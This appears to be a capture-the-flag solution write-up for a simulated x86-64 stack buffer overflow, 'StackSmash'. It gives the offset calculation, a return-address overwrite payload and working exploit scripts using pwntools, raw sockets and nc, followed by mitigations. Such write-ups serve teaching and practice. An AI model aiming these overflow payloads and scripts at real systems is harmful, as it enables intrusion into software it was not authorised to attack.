# Challenge 24: StackSmash — Solution

## Vulnerability Type
**Stack-Based Buffer Overflow (x86-64 simulation)**

## Description
The challenge simulates a classic `gets()`-style buffer overflow. The vulnerable function copies user input into a 32-byte buffer with no bounds check. If the payload is long enough, it overwrites the saved RBP (8 bytes) and then the return address (8 bytes) on the simulated stack. Redirecting the return address to `win()` triggers the flag.

## Vulnerable Code

```python
# chall.py — vuln()
data = bytes.fromhex(raw)   # no length limit!

# Simulated stack: [buffer(32)] [saved_rbp(8)] [ret_addr(8)]
# ret_addr extracted at offset 40
ret_bytes = data[40:48]
ret_addr  = struct.unpack("<Q", ret_bytes)[0]

if ret_addr == WIN_ADDR:    # 0xdeadbeefcafe
    win()
```

The real-world C equivalent:

```c
void vuln() {
    char buf[32];
    gets(buf);          // no bounds check — classic overflow
    return;             // return address already overwritten!
}
```

## Memory Layout

```
Low address
  ┌──────────────────────────┐
  │  buffer       (32 bytes) │  ← offset 0x00
  ├──────────────────────────┤
  │  saved RBP    (8 bytes)  │  ← offset 0x20  (fill with anything)
  ├──────────────────────────┤
  │  return addr  (8 bytes)  │  ← offset 0x28  (overwrite with WIN_ADDR)
  └──────────────────────────┘
High address
```

## Exploitation Steps

**Step 1** — Identify the target address from the program output:
```
[i] win()   @ 0xdeadbeefcafe
```

**Step 2** — Calculate offsets:
- 32 bytes to fill buffer
- 8 bytes to overwrite saved RBP (arbitrary)
- 8 bytes = WIN_ADDR in little-endian at offset 40

**Step 3** — Build payload:
```
payload = b"A" * 40 + struct.pack("<Q", 0xdeadbeefcafe)
```

In hex:
```
41414141414141414141414141414141  (16 bytes)
41414141414141414141414141414141  (16 bytes)
4141414141414141                  (8 bytes saved RBP)
fecaefbeadde0000                  (8 bytes WIN_ADDR little-endian)
```

Full hex string: `4141414141414141414141414141414141414141414141414141414141414141 4141414141414141 fecaefbeadde0000`
(no spaces)

## Complete Exploit Script

```python
import struct
from pwn import *

TARGET_HOST = "<host>"
TARGET_PORT = 1337

WIN_ADDR = 0xdeadbeefcafe

# Build payload
padding  = b"A" * 40          # buffer (32) + saved RBP (8)
ret_addr = struct.pack("<Q", WIN_ADDR)
payload  = padding + ret_addr

print(f"[*] Payload ({len(payload)} bytes): {payload.hex()}")

# Send over TCP
r = remote(TARGET_HOST, TARGET_PORT)
r.recvuntil(b"payload (hex):")
r.sendline(payload.hex().encode())
print(r.recvall(timeout=3).decode())
```

### Without pwntools (pure Python)

```python
import socket, struct

HOST = "<host>"
PORT = 1337
WIN_ADDR = 0xdeadbeefcafe

payload = b"A" * 40 + struct.pack("<Q", WIN_ADDR)

with socket.create_connection((HOST, PORT)) as sock:
    data = b""
    while b"payload (hex):" not in data:
        data += sock.recv(4096)
    print(data.decode())
    sock.sendall(payload.hex().encode() + b"\n")
    print(sock.recv(4096).decode())
```

### Manual with nc

```bash
python3 -c "
import struct
padding  = b'A' * 40
ret_addr = struct.pack('<Q', 0xdeadbeefcafe)
print((padding + ret_addr).hex())
" | nc <host> 1337
```

## Step-by-Step Walkthrough

```
1. Program prints:
     [i] win()   @ 0xdeadbeefcafe
     Buffer size: 32 bytes

2. We need to reach offset 40 (32 buf + 8 rbp) before our 8-byte address.

3. 0xdeadbeefcafe in little-endian 8 bytes:
     fe ca ef be ad de 00 00

4. Full payload hex (48 bytes):
     4141...41 (40 × 0x41) + fecaefbeadde0000

5. Server extracts bytes[40:48] → 0xdeadbeefcafe → calls win() → FLAG
```

## Mitigation

```c
// 1. Use size-bounded input functions
fgets(buf, sizeof(buf), stdin);   // safe: limits to sizeof(buf)-1

// 2. Compile with stack canary (-fstack-protector-strong)
// 3. Enable ASLR (Address Space Layout Randomization)
// 4. Use NX (No-Execute) bit on stack
// 5. Use safer languages that do bounds checking by default (Rust, Go)
```

## Concepts Demonstrated

| Concept | Explanation |
|---|---|
| Buffer overflow | Writing past the end of a fixed-size buffer |
| Stack layout | Buffer → saved RBP → return address on x86-64 |
| Little-endian | x86-64 stores multi-byte values LSB first |
| RIP control | Overwriting return address redirects execution |
| `win()` pattern | Classic CTF: reach hidden function to get flag |

## References
- [Live Overflow — Buffer Overflow](https://liveoverflow.com/binary-hacking/)
- [pwntools documentation](https://docs.pwntools.com/)
- [x86-64 Stack Frame Layout](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)
